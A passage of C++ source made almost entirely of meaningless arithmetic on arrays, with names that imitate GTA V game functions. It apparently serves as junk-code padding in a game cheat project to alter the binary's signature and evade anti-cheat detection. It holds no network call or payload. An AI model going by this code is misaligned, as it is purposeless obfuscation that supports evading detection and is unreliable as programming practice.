			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			_mkdir(Diretorio);
		}
	};
	namespace Simple_TXT_file
	{
		int PED_TO_NET_ = 2;
		int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		int offset = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		float a = 0.0f;
		float b = 0.0f;
		int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

		int ponteiro = 2;
		int aaaaaa = ponteiro * 2;
		int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		std::string TXTFilePath;
		int GetVectorSize(std::vector<string> vetor)
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
